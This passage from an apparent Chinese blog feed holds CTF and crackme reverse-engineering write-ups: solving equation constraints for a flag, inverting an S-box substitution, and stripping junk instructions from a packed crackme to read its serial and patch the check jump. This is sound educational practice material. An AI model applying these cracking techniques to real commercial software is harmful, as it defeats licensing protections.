        [5653, 9349, 9419, 2459, 2423, 1823, 1291,2423, 3671, 4673, 1033, 8389, 2777, 8629, 6203, 6673, 1877, 7583, 5077, 9227, 6037, 2339],
        [1663, 3529, 9631, 6833,17, 3697, 4327, 6053, 7639, 6679, 797, 3209, 3191, 3259, 5563, 5717, 3181, 1571, 751, 1163, 211, 4421],
        [2273, 9341, 8081, 9311, 41, 4241, 1279, 4483, 6581, 6863, 7583, 4129, 1543, 5651, 4357,9521, 5557, 11, 7723, 2441, 6733, 6521],
        [1171, 241,9851, 3583, 1609, 43, 9281, 5867, 2819, 5659, 4493, 223, 2767, 3221, 6173, 6947, 5897, 6113, 6737, 3989, 9733, 3467],
        [173, 2099, 2953, 7243, 4987, 1723, 2657, 1213, 2731, 7507, 9721, 4637, 9203, 5407, 3169, 5003, 8681,2, 3329, 5843, 8017, 83],
        [5119, 3109, 8369, 7993, 2927, 127, 5233, 4783, 5171, 3907, 1613, 4567, 3343, 2617, 5387, 8713, 7829, 3559, 419, 9931, 6067, 4481]
        ]//这一个数组里包含的是方程组的系数
print len(matrix)
for i in matrix:
    if len(i)==21:
        print i
result  = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,73,99,49,49,125]
if __name__ == &apos;__main__&apos; :
       #gen_matrix()
       verify   = numpy.array(verify )
       matrix   = numpy.array(matrix )
       print numpy.linalg.solve(matrix,verify)//解方程组
       #print result
       for   x in xrange(len(result)):
              sys.stdout.write(chr(result[x]))
</code></pre>]]></content>
      <tags>
        <tag>python</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse之第三更</title>
    <url>/2017/01/19/reverse%E4%B9%8B%E7%AC%AC%E4%B8%89%E6%9B%B4/</url>
    <content><![CDATA[<p>reverse第三更<br><a id="more"></a><br>程序打开，对话框上的确定按钮一直是隐藏的，输入16个字符之后按钮会显示出来。</p>
<p>使用OD打开程序，搜索字符串，找到了你赢啦，“Flag就是你的口令”。</p>
<p><img src="http://p1.bqimg.com/567571/08cdef6067b2cb75.png" alt=""></p>
<p>这段代码的主要作用是判断0x00571458内存里字符串的长度，如果是8就跳转到成功，所以只要使0x00571458字符串长度为8就成功了。</p>
<p>接下来在0x00571458处下硬件断点，废了好大功夫下好这个断点，羞愧欲死啊！！！</p>
<p>首先在数据窗口跟随</p>
<p><img src="http://i1.piimg.com/567571/4c4f1a43d29ca874.png" alt=""></p>
<p>接下来转到表达式，00571458，选中地址的数据段，在该位置下硬件写入断点。<br>再次运行会出现在如下位置：<br><img src="http://i1.piimg.com/567571/578aad55142c8f09.png" alt=""></p>
<p>输入的16个字符经过004017C0()函数每两个字符组合为一组，例如ABCDEF1234567890变成了AB，CD，EF，12，34，56，78，90</p>
<p><img src="http://i1.piimg.com/567571/338969cf397fd41b.png" alt=""></p>
<p>接下来就是找关键的加密算法：</p>
<p><img src="http://i1.piimg.com/567571/14beb8b431510235.png" alt=""></p>
<p>找到sub_401B80()函数</p>
<pre><code>int __stdcall sub_401B80(int a1)
{
  sub_401970();
  if ( (unsigned __int8)(flag_3_ + flag_2_ + flag_1_ + flag_0_) == 71
    &amp;&amp; (unsigned __int8)(flag_7_ + flag_6_ + flag_5_) == 3
    &amp;&amp; (unsigned __int8)flag_0_ == flag_1_ + 68
    &amp;&amp; flag_1_ == (unsigned __int8)flag_2_ + 2
    &amp;&amp; (unsigned __int8)flag_2_ == (unsigned __int8)flag_3_ - 59
    &amp;&amp; (unsigned __int8)flag_6_ == (unsigned __int8)flag_4_ + 10
    &amp;&amp; (unsigned __int8)flag_6_ == (unsigned __int8)flag_7_ + 9
    &amp;&amp; (unsigned __int8)flag_4_ == flag_5_ + 52 )
  {
    JUMPOUT(__CS__, 0x1947 + 0x400000);
  }
  return 0;
}
</code></pre><p>sub_401970()函数是加密过程之后就是判断输入是否正确。</p>
<p>首先将上面的方程组解出来，方程组分成两个部分解，flag0，1，2，3一起，flag4，5，6，7一起解。需要注意的是int8类型</p>
<p>flag4~flag7只有一个解</p>
<pre><code>flag4=100，flag5=48，flag6=110，flag7=101
</code></pre><p>flag0~flag4有三个解</p>
<pre><code>flag0=183,flag1=115,flag2=113,flag3=172
flag0=119,flag1=51,flag2=49,flag3=108
flag0=247,flag1=179,flag2=177,flag3=236
</code></pre><p>sub_401970()函数里是一个置换表，每一个输入的字符都会经过四次置换，最终进行判断。</p>
<p>还有一个需要注意的是在没输入之前和输入之后置换表是不一样的，运行之后是正确的置换表：</p>
<pre><code>0056B0D0  63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76  
0056B0E0  CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 
0056B0F0  B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15  
0056B100  04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75  
0056B110  09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84  
0056B120  53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF 
0056B130  D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8  
0056B140  51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2  
0056B150  CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73  
0056B160  60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB  
0056B170  E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79  
0056B180  E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 
0056B190  BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A  
0056B1A0  70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E 
0056B1B0  E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF
0056B1C0  8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16  
</code></pre><p><img src="http://i1.piimg.com/567571/dbc9f5f1362bf56f.png" alt=""></p>
<p>通过置换表逆推flag</p>
<pre><code>buf=[0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
        0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
        0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
        0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
        0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
        0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
        0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
        0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
        0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
        0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
        0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
        0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
        0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
        0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
        0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16]
d={}
for n,item in enumerate(buf):
    d[item]=n
#buf1=[183,115,113,172,100,48,110,101]
#buf1=[247,179,177,236,100,48,110,101]
buf1=[119,51,49,108,100,48,110,101]

flag=&apos;&apos;
for i in buf1:
    nCurrent=i
    for j in range(0,64*4):
        nCurrent=d[nCurrent]
    flag+=&quot;%02X&quot;%nCurrent
print(flag)
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse之第九更</title>
    <url>/2017/02/04/reverse%E4%B9%8B%E7%AC%AC%E4%B9%9D%E6%9B%B4/</url>
    <content><![CDATA[<p>转载来自看雪论坛@PEdiy.com<br><a id="more"></a></p>
<p>本题出自看雪2016VrackMe第21，程序有壳有花，serial验证部分很容易。</p>
<p>入口出就可以看出程序被加了壳，不过调试之后发现很简单的一个壳，很容易就可以找到OEP，我是直接单步调试下去，找到如下这个跳转，直接就跳转到OEP了。</p>
<p>壳可以脱掉也可以不脱带壳调试也行，在这个位置下断点，之后取消断点，运行到OEP。</p>
<p>接下来 bp ReadFile 断下程序后，不远就能跟到关键过程，花指令影响分析，手工清除对算法分析有干扰的花指令，有耐心慢慢看。</p>
<p>PS：本题花指令很多都是基于变形跳转指令的组合，填充了垃圾代码，就像开车的时候挡风玻璃迷雾了，怎么办？开除雾模式吧。</p>
<pre><code>0040369B   &gt; \68 FF444000   PUSH crackme_.004044FF                   ;  内存访问断点4044FF
004036A0   .  68 03000000   PUSH 0x3
004036A5   .  B8 01000000   MOV EAX,0x1
004036AA   .  BB B0634400   MOV EBX,crackme_.004463B0
004036AF   .  E8 090F0000   CALL crackme_.004045BD                   ;  创建线程子程序
//创建线程子程序，内存访问断点4044FF，跟踪线程

004038A4    F8              CLC
004038A5    73 01           JNB Xcrackme_.004038A8
004038A7    B4 F9           MOV AH,0xF9
004038A9    72 01           JB Xcrackme_.004038AC
004038AB    0FF972 01       PSUBW MM6,QWORD PTR DS:[EDX+0x1]
004038AF    B9 B8D87346     MOV ECX,0x4673D8B8
//花指令 F8 73 01 B4 F9 72 01 0F F9 72 01 B9 NOP掉


004038A4    90              NOP
004038A5    90              NOP
004038A6    90              NOP
004038A7    90              NOP
004038A8    90              NOP
004038A9    90              NOP
004038AA    90              NOP
004038AB    90              NOP
004038AC    90              NOP
004038AD    90              NOP
004038AE    90              NOP
004038AF    90              NOP
004038B0    B8 D8734600     MOV EAX,crackme_.004673D8
//去花指令之后

004038D3    E8 00000000     CALL crackme_.004038D8
004038D8    830424 06       ADD DWORD PTR SS:[ESP],0x6
004038DC    C3              RETN
004038DD    B8 8B1DE840     MOV EAX,0x40E81D8B
004038E2    48              DEC EAX
004038E3    0053 E8         ADD BYTE PTR DS:[EBX-0x18],DL
004038E6    BB 0C000083     MOV EBX,0x8300000C
//花指令 E8 00 00 00 00 83 04 24 06 C3 B8 NOP掉

004038D3    90              NOP
004038D4    90              NOP
004038D5    90              NOP
004038D6    90              NOP
004038D7    90              NOP
004038D8    90              NOP
004038D9    90              NOP
004038DA    90              NOP
004038DB    90              NOP
004038DC    90              NOP
004038DD    90              NOP
004038DE    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
//去花指令之后

004038F3    F9              STC
004038F4    72 01           JB Xcrackme_.004038F7
004038F6    0FF873 01       PSUBB MM6,QWORD PTR DS:[EBX+0x1]
004038FA    7B E8           JPO Xcrackme_.004038E4
004038FC    0000            ADD BYTE PTR DS:[EAX],AL
004038FE    0000            ADD BYTE PTR DS:[EAX],AL
00403900    830424 06       ADD DWORD PTR SS:[ESP],0x6
00403904    C3              RETN
00403905    0F8B 1DE84048   JPO 48812128
0040390B    0033            ADD BYTE PTR DS:[EBX],DH
0040390D    C083 3B007E03 8&gt;ROL BYTE PTR DS:[EBX+0x37E003B],0x8B                       ; 移位常量超出 1..31 的范围
//花指令 F9 72 01 0F F8 73 01 7B E8 00 00 00 00 83 04 24 06 C3 0F NOP掉

004038F3    90              NOP
004038F4    90              NOP
004038F5    90              NOP
004038F6    90              NOP
004038F7    90              NOP
004038F8    90              NOP
004038F9    90              NOP
004038FA    90              NOP
004038FB    90              NOP
004038FC    90              NOP
004038FD    90              NOP
004038FE    90              NOP
004038FF    90              NOP
00403900    90              NOP
00403901    90              NOP
00403902    90              NOP
00403903    90              NOP
00403904    90              NOP
00403905    90              NOP
00403906    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
0040390C    33C0            XOR EAX,EAX
0040390E    833B 00         CMP DWORD PTR DS:[EBX],0x0
//去花指令之后

00403919    F9              STC
0040391A    72 01           JB Xcrackme_.0040391D
0040391C    B7 EB           MOV BH,0xEB
0040391E    010F            ADD DWORD PTR DS:[EDI],ECX
00403920    68 04000080     PUSH 0x80000004
00403925    6A 00           PUSH 0x0
00403927    EB 01           JMP Xcrackme_.0040392A
00403929  ^ 74 A1           JE Xcrackme_.004038CC
0040392B    E0 40           LOOPDNE Xcrackme_.0040396D
0040392D    48              DEC EAX
0040392E    0085 C07505B8   ADD BYTE PTR SS:[EBP+0xB80575C0],AL
00403934    D7              XLAT BYTE PTR DS:[EBX+AL]
00403935    73 46           JNB Xcrackme_.0040397D
//花指令 F9 72 01 B7 EB 01 0F 68 04 00 00 80 6A 00 EB 01 74 NOP掉

00403919    90              NOP
0040391A    90              NOP
0040391B    90              NOP
0040391C    90              NOP
0040391D    90              NOP
0040391E    90              NOP
0040391F    90              NOP
00403920    90              NOP
00403921    90              NOP
00403922    90              NOP
00403923    90              NOP
00403924    90              NOP
00403925    90              NOP
00403926    90              NOP
00403927    90              NOP
00403928    90              NOP
00403929    90              NOP
0040392A    A1 E0404800     MOV EAX,DWORD PTR DS:[0x4840E0]
0040392F    85C0            TEST EAX,EAX
00403931    75 05           JNZ Xcrackme_.00403938
//去花指令之后

0040394E   /EB 01           JMP Xcrackme_.00403951
00403950   |0FE800          PSUBSB MM0,QWORD PTR DS:[EAX]
00403953    0000            ADD BYTE PTR DS:[EAX],AL
00403955    0083 042406C3   ADD BYTE PTR DS:[EBX+0xC3062404],AL
0040395B    B7 F8           MOV BH,0xF8
0040395D    73 01           JNB Xcrackme_.00403960
0040395F    848B 45F43945   TEST BYTE PTR DS:[EBX+0x4539F445],CL
00403965    F8              CLC
//花指令 EB 01 0F E8 00 00 00 00 83 04 24 06 C3 B7 F8 73 01 84 NOP掉

0040394E    90              NOP
0040394F    90              NOP
00403950    90              NOP
00403951    90              NOP
00403952    90              NOP
00403953    90              NOP
00403954    90              NOP
00403955    90              NOP
00403956    90              NOP
00403957    90              NOP
00403958    90              NOP
00403959    90              NOP
0040395A    90              NOP
0040395B    90              NOP
0040395C    90              NOP
0040395D    90              NOP
0040395E    90              NOP
0040395F    90              NOP
00403960    8B45 F4         MOV EAX,DWORD PTR SS:[EBP-0xC]
00403963    3945 F8         CMP DWORD PTR SS:[EBP-0x8],EAX                             ; 比较注册码位数为14位
00403966    0F85 39070000   JNZ crackme_.004040A5
//去花指令之后

0040396C   /EB 01           JMP Xcrackme_.0040396F
0040396E   |88EB            MOV BL,CH
00403970    010F            ADD DWORD PTR DS:[EDI],ECX
00403972    68 04000080     PUSH 0x80000004
00403977    6A 00           PUSH 0x0
00403979    EB 01           JMP Xcrackme_.0040397C
0040397B    B3 A1           MOV BL,0xA1
0040397D    E0 40           LOOPDNE Xcrackme_.004039BF
0040397F    48              DEC EAX
00403980    0085 C07505B8   ADD BYTE PTR SS:[EBP+0xB80575C0],AL
00403986    D7              XLAT BYTE PTR DS:[EBX+AL]
//花指令 EB 01 88 EB 01 0F 68 04 00 00 80 6A 00 EB 01 B3 NOP掉

0040396C    90              NOP
0040396D    90              NOP
0040396E    90              NOP
0040396F    90              NOP
00403970    90              NOP
00403971    90              NOP
00403972    90              NOP
00403973    90              NOP
00403974    90              NOP
00403975    90              NOP
00403976    90              NOP
00403977    90              NOP
00403978    90              NOP
00403979    90              NOP
0040397A    90              NOP
0040397B    90              NOP
0040397C    A1 E0404800     MOV EAX,DWORD PTR DS:[0x4840E0]
00403981    85C0            TEST EAX,EAX
00403983    75 05           JNZ Xcrackme_.0040398A
00403985    B8 D7734600     MOV EAX,crackme_.004673D7
//去花指令之后

0040399A    83C4 10         ADD ESP,0x10
0040399D    F8              CLC
0040399E    73 01           JNB Xcrackme_.004039A1
004039A0    70 33           JO Xcrackme_.004039D5
004039A2    C9              LEAVE
004039A3    50              PUSH EAX
004039A4    F9              STC
004039A5    72 01           JB Xcrackme_.004039A8
004039A7    BB 8D45FC8B     MOV EBX,0x8BFC458D
//花指令 83 C4 10 F8 73 01 70 以及 F9 72 01 BB NOP掉

0040399A    90              NOP
0040399B    90              NOP
0040399C    90              NOP
0040399D    90              NOP
0040399E    90              NOP
0040399F    90              NOP
004039A0    90              NOP
004039A1    33C9            XOR ECX,ECX
004039A3    50              PUSH EAX
004039A4    90              NOP
004039A5    90              NOP
004039A6    90              NOP
004039A7    90              NOP
004039A8    8D45 FC         LEA EAX,DWORD PTR SS:[EBP-0x4]
//去花指令之后

004039BC   /EB 01           JMP Xcrackme_.004039BF
004039BE  ^|74 F9           JE Xcrackme_.004039B9
004039C0    72 01           JB Xcrackme_.004039C3
004039C2    0F6801          PUNPCKHBW MM0,QWORD PTR DS:[ECX]
004039C5    0300            ADD EAX,DWORD PTR DS:[EAX]
004039C7    806A 00 F9      SUB BYTE PTR DS:[EDX],0xF9
004039CB    72 01           JB Xcrackme_.004039CE
004039CD    BB 68010000     MOV EBX,0x168
004039D2    0068 01         ADD BYTE PTR DS:[EAX+0x1],CH
004039D5    0300            ADD EAX,DWORD PTR DS:[EAX]
004039D7    806A 00 F8      SUB BYTE PTR DS:[EDX],0xF8
//花指令 EB 01 74 F9 72 01 0F 以及 F9 72 01 BB NOP掉

004039BC    90              NOP
004039BD    90              NOP
004039BE    90              NOP
004039BF    90              NOP
004039C0    90              NOP
004039C1    90              NOP
004039C2    90              NOP
004039C3    68 01030080     PUSH 0x80000301
004039C8    6A 00           PUSH 0x0
004039CA    90              NOP
004039CB    90              NOP
004039CC    90              NOP
004039CD    90              NOP
004039CE    68 01000000     PUSH 0x1
004039D3    68 01030080     PUSH 0x80000301
004039D8    6A 00           PUSH 0x0
//去花指令之后

004039DA    F8              CLC
004039DB    73 01           JNB Xcrackme_.004039DE
004039DD    0FFF            ???                                                        ; 未知命令
004039DF  ^ 75 FC           JNZ Xcrackme_.004039DD
004039E1    68 04000080     PUSH 0x80000004
004039E6    6A 00           PUSH 0x0
004039E8    EB 01           JMP Xcrackme_.004039EB
004039EA    0FA1            POP FS                                                     ; 段寄存器更改
004039EC    E0 40           LOOPDNE Xcrackme_.00403A2E
004039EE    48              DEC EAX
004039EF    0085 C07505B8   ADD BYTE PTR SS:[EBP+0xB80575C0],AL
//花指令 F8 73 01 0F 以及 EB 01 0F NOP掉

004039DA    90              NOP
004039DB    90              NOP
004039DC    90              NOP
004039DD    90              NOP
004039DE    FF75 FC         PUSH DWORD PTR SS:[EBP-0x4]
004039E1    68 04000080     PUSH 0x80000004
004039E6    6A 00           PUSH 0x0
004039E8    90              NOP
004039E9    90              NOP
004039EA    90              NOP
004039EB    A1 E0404800     MOV EAX,DWORD PTR DS:[0x4840E0]
004039F0    85C0            TEST EAX,EAX
004039F2    75 05           JNZ Xcrackme_.004039F9
004039F4    B8 D7734600     MOV EAX,crackme_.004673D7
//去花指令之后

00403A0F   /EB 01           JMP Xcrackme_.00403A12
00403A11   |828B 1DE84048 0&gt;OR BYTE PTR DS:[EBX+0x4840E81D],0x0
00403A18    E8 93FDFFFF     CALL crackme_.004037B0
// 花指令 EB 01 82 NOP掉

00403A0F    90              NOP
00403A10    90              NOP
00403A11    90              NOP
00403A12    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
00403A18    E8 93FDFFFF     CALL crackme_.004037B0
//去花指令之后

00403A1F    F8              CLC
00403A20    73 01           JNB Xcrackme_.00403A23
00403A22    0FEB01          POR MM0,QWORD PTR DS:[ECX]
00403A25    85EB            TEST EBX,EBP
00403A27    018B 8B1DE840   ADD DWORD PTR DS:[EBX+0x40E81D8B],ECX
00403A2D    48              DEC EAX
00403A2E    0033            ADD BYTE PTR DS:[EBX],DH
00403A30    C083 3B007E03 8&gt;ROL BYTE PTR DS:[EBX+0x37E003B],0x8B                       ; 移位常量超出 1..31 的范围
//花指令 F8 73 01 0F EB 01 85 EB 01 8B NOP掉

00403A1F    90              NOP
00403A20    90              NOP
00403A21    90              NOP
00403A22    90              NOP
00403A23    90              NOP
00403A24    90              NOP
00403A25    90              NOP
00403A26    90              NOP
00403A27    90              NOP
00403A28    90              NOP
00403A29    8B1D E8404800   MOV EBX,DWORD PTR DS:[0x4840E8]
00403A2F    33C0            XOR EAX,EAX
00403A31    833B 00         CMP DWORD PTR DS:[EBX],0x0
00403A34    7E 03           JLE Xcrackme_.00403A39
00403A36    8B43 04         MOV EAX,DWORD PTR DS:[EBX+0x4]
//去花指令之后

00403A3C   /EB 01           JMP Xcrackme_.00403A3F
00403A3E   |0FEB01          POR MM0,QWORD PTR DS:[ECX]
00403A41    8BDB            MOV EBX,EBX
00403A43    45              INC EBP
00403A44    F4              HLT                                                        ; 特权命令
//花指令 EB 01 0F EB 01 8B NOP掉

00403A3C    90              NOP
00403A3D    90              NOP
00403A3E    90              NOP
00403A3F    90              NOP
00403A40    90              NOP
00403A41    90              NOP
00403A42    DB45 F4         FILD DWORD PTR SS:[EBP-0xC]
//去花指令之后

00403A57    F8              CLC
00403A58    73 01           JNB Xcrackme_.00403A5B
00403A5A  ^ 78 E8           JS Xcrackme_.00403A44
00403A5C    0000            ADD BYTE PTR DS:[EAX],AL
00403A5E    0000            ADD BYTE PTR DS:[EAX],AL
00403A60    830424 06       ADD DWORD PTR SS:[ESP],0x6
00403A64    C3              RETN
00403A65    BE DD45DCDC     MOV ESI,0xDCDC45DD
00403A6A    05 18744600     ADD EAX,crackme_.00467418
//花指令 F8 73 01 78 E8 00 00 00 00 83 04 24 06 C3 BE NOP掉

00403A57    90              NOP
00403A58    90              NOP
00403A59    90              NOP
00403A5A    90              NOP
00403A5B    90              NOP
00403A5C    90              NOP
00403A5D    90              NOP
00403A5E    90              NOP
00403A5F    90              NOP
00403A60    90              NOP
00403A61    90              NOP
00403A62    90              NOP
00403A63    90              NOP
00403A64    90              NOP
00403A65    90              NOP
00403A66    DD45 DC         FLD QWORD PTR SS:[EBP-0x24]
00403A69    DC05 18744600   FADD QWORD PTR DS:[0x467418]
00403A6F    DD5D D4         FSTP QWORD PTR SS:[EBP-0x2C]
00403A72    DD45 D4         FLD QWORD PTR SS:[EBP-0x2C]
//去花指令之后

00403A7A   /EB 01           JMP Xcrackme_.00403A7D
00403A7C   |0F4879 0D       CMOVS EDI,DWORD PTR DS:[ECX+0xD]
//花指令 EB 01 0F NOP掉

00403A7A    90              NOP
00403A7B    90              NOP
00403A7C    90              NOP
00403A7D    48              DEC EAX
00403A7E    79 0D           JNS Xcrackme_.00403A8D
//去花指令之后

00403AA8    F9              STC
00403AA9    72 01           JB Xcrackme_.00403AAC
00403AAB    8F              ???                                                        ; 未知命令
00403AAC    F8              CLC
00403AAD    73 01           JNB Xcrackme_.00403AB0
00403AAF    8268 01 01      SUB BYTE PTR DS:[EAX+0x1],0x1
00403AB3    0080 6A00F873   ADD BYTE PTR DS:[EAX+0x73F8006A],AL
//花指令 F9 72 01 8F F8 73 01 82 NOP掉

00403AA8    90              NOP
00403AA9    90              NOP
00403AAA    90              NOP
00403AAB    90              NOP
00403AAC    90              NOP
00403AAD    90              NOP
00403AAE    90              NOP
00403AAF    90              NOP
00403AB0    68 01010080     PUSH 0x80000101
00403AB5    6A 00           PUSH 0x0
//去花指令之后

00403AB7    F8              CLC
00403AB8    73 01           JNB Xcrackme_.00403ABB
00403ABA  ^ 74 8B           JE Xcrackme_.00403A47
00403ABC    5D              POP EBP
00403ABD    D08A 03506801   ROR BYTE PTR DS:[EDX+0x1685003],1
00403AC3    0000            ADD BYTE PTR DS:[EAX],AL
//花指令  F8 73 01 74 NOP掉

00403AB7    90              NOP
00403AB8    90              NOP
00403AB9    90              NOP
00403ABA    90              NOP
00403ABB    8B5D D0         MOV EBX,DWORD PTR SS:[EBP-0x30]                            ; 真正的注册码存放地址
00403ABE    8A03            MOV AL,BYTE PTR DS:[EBX]                                   ; 取真正的注册码按byte
//去花指令之后

//查看[EBX]内容：（正确注册码在这里呀）
0015CCC0  00000074 &apos;t&apos;
0015CCC4  00000066 &apos;f&apos;
0015CCC8  0000006F &apos;o&apos;
0015CCCC  00000073 &apos;s&apos;
0015CCD0  00000065 &apos;e&apos;
0015CCD4  00000064 &apos;d&apos;
0015CCD8  00000069 &apos;i&apos;
0015CCDC  00000077 &apos;w&apos;
0015CCE0  00000079 &apos;y&apos;
0015CCE4  00000062 &apos;b&apos;
0015CCE8  00000065 &apos;e&apos;
0015CCEC  00000064 &apos;d&apos;
0015CCF0  0000006F &apos;o&apos;
0015CCF4  00000063 &apos;c&apos;

00403AD3    8945 CC         MOV DWORD PTR SS:[EBP-0x34],EAX                            ; 正确注册码地址存入内存
00403AD6   /EB 01           JMP Xcrackme_.00403AD9
00403AD8   |0FEB01          POR MM0,QWORD PTR DS:[ECX]
00403ADB    BE E8000000     MOV ESI,0xE8
00403AE0    0083 042406C3   ADD BYTE PTR DS:[EBX+0xC3062404],AL
00403AE6    818B 45CCF873 0&gt;OR DWORD PTR DS:[EBX+0x73F8CC45],0xEB508501
00403AF0    01B1 FF75F8E8   ADD DWORD PTR DS:[ECX+0xE8F875FF],ESI
00403AF6    FD              STD
00403AF7    FC              CLD
00403AF8    FFFF            ???                                                        ; 未知命令
//花指令 EB 01 0F EB 01 BE E8 00 00 00 00 83 04 24 06 C3 81 以及 F8 73 01 85 NOP掉

00403AD3    8945 CC         MOV DWORD PTR SS:[EBP-0x34],EAX                            ; 正确注册码地址存入内存
00403AD6    90              NOP
00403AD7    90              NOP
00403AD8    90              NOP
00403AD9    90              NOP
00403ADA    90              NOP
00403ADB    90              NOP
00403ADC    90              NOP
00403ADD    90              NOP
00403ADE    90              NOP
00403ADF    90              NOP
00403AE0    90              NOP
00403AE1    90              NOP
00403AE2    90              NOP
00403AE3    90              NOP
00403AE4    90              NOP
00403AE5    90              NOP
00403AE6    90              NOP
00403AE7    8B45 CC         MOV EAX,DWORD PTR SS:[EBP-0x34]
00403AEA    90              NOP
00403AEB    90              NOP
00403AEC    90              NOP
00403AED    90              NOP
00403AEE    50              PUSH EAX
00403AEF    EB 01           JMP Xcrackme_.00403AF2
00403AF1    B1 FF           MOV CL,0xFF
00403AF3  ^ 75 F8           JNZ Xcrackme_.00403AED
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7
//去花指令之后

00403AEF   /EB 01           JMP Xcrackme_.00403AF2
00403AF1   |B1 FF           MOV CL,0xFF
00403AF3  ^ 75 F8           JNZ Xcrackme_.00403AED
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7
00403AFA    83C4 08         ADD ESP,0x8
00403AFD    83F8 00         CMP EAX,0x0
//花指令 EB 01 B1 NOP掉

00403AEF    90              NOP
00403AF0    90              NOP
00403AF1    90              NOP
00403AF2    FF75 F8         PUSH DWORD PTR SS:[EBP-0x8]
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7
00403AFA    83C4 08         ADD ESP,0x8
00403AFD    83F8 00         CMP EAX,0x0
//去花指令之后

00403AF2    FF75 F8         PUSH DWORD PTR SS:[EBP-0x8]
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7                                     ; 关键比较
00403AFA    83C4 08         ADD ESP,0x8
00403AFD    83F8 00         CMP EAX,0x0
//可以跟进 4037F7

00403825    8B02            MOV EAX,DWORD PTR DS:[EDX]
00403827    3A01            CMP AL,BYTE PTR DS:[ECX]                                   ; 核心比较，也可以条件记录断点下这里，记录[ECX]便是每一位正确注册码
00403829    75 2B           JNZ Xcrackme_.00403856
//对比校验注册码，每次只比较一位（失败就不再校验剩余注册码）

//如果前面被花指令干扰没有看到正确注册码，那么在此下条件记录断点，也可以从记录中看到比较值
//Log data 取末尾byte作为字符ascii

地址       消息
00403827   COND: 00150063 &apos;c&apos;
00403827   COND: 0015006F &apos;o&apos;
00403827   COND: 00150064 &apos;d&apos;
00403827   COND: 00150065 &apos;e&apos;
00403827   COND: 00150062 &apos;b&apos;
00403827   COND: 00150079 &apos;y&apos;
00403827   COND: 00150077 &apos;w&apos;
00403827   COND: 00150069 &apos;i&apos;
00403827   COND: 00150064 &apos;d&apos;
00403827   COND: 00150065 &apos;e&apos;
00403827   COND: 00150073 &apos;s&apos;
00403827   COND: 0015006F &apos;o&apos;
00403827   COND: 00150066 &apos;f&apos;
00403827   COND: 00150074 &apos;t&apos;

00403B2B    837D C8 00      CMP DWORD PTR SS:[EBP-0x38],0x0
00403B2F    0F84 0C000000   JE crackme_.00403B41                                       ; 关键跳转
//此处改为JMP那么也就爆破了

00403B35   /EB 01           JMP Xcrackme_.00403B38
00403B37   |B7 F9           MOV BH,0xF9
00403B39    72 01           JB Xcrackme_.00403B3C
00403B3B    86E9            XCHG CL,CH
